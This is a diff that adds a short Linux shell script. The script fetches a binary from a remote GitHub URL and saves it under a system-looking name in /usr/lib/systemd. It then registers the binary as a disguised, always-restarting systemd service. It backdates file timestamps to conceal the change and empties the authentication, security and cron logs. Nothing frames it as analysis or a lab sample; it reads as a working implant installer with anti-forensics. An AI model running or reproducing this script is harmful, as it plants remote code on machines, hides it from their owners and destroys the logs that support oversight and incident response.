@@ -1,0 +1,14 @@
+wget https://raw.githubusercontent.com/snoopyahoo/online/master/jinchan -O /usr/lib/systemd/systemd-apt-power
+chmod 755 /usr/lib/systemd/systemd-apt-power
+touch -t 201903301106 /usr/lib/systemd
+echo -e "[Unit]\nDescription=Configure fs root support\nDefaultDependencies=no\nConflicts=shutdown.target\nBefore=shutdown.target emergency.service emergency.target systemd-tmpfiles-setup.service local-fs.target systemd-random-seed.service\nAfter=systemd-remount-fs.service\n\n[Service]\nRestartSec=5\nExecStart=/usr/lib/systemd/systemd-apt-power\nExecStop=/usr/lib/systemd/systemd-apt-power\nType=forking\nTimeoutSec=0\nRestart=always\n\n[Install]\nWantedBy=local-fs.target">/usr/lib/systemd/system/systemd-apt-power.service
+systemctl start systemd-apt-power
+systemctl enable systemd-apt-power
+systemctl status systemd-apt-power
+touch -t 201910292036 /usr/lib/systemd/system
+touch -t 201810241823 systemd-apt-power.service
+echo > /var/log/btmp
+echo > /var/log/message
+echo > /var/log/secure
+echo > /var/log/cron
+echo > /var/log/auth.log
